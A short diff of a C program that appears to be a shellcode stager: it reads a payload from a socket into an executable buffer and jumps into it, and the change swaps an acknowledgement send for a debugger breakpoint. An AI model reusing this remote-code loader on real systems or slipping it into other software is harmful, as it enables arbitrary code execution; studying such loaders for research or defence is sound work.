@@ -52,8 +52,8 @@ int main() {
     rcvd += res;
   } while (size > rcvd);
 
-  send(ConnectSocket, "OK", 3, 0);
-
+  //send(ConnectSocket, "OK", 3, 0);
+  asm("int $3");
   printf("Executing payload.\n");
   // Execute the received payload
   (*(void(*)()) (rwx + 4))();
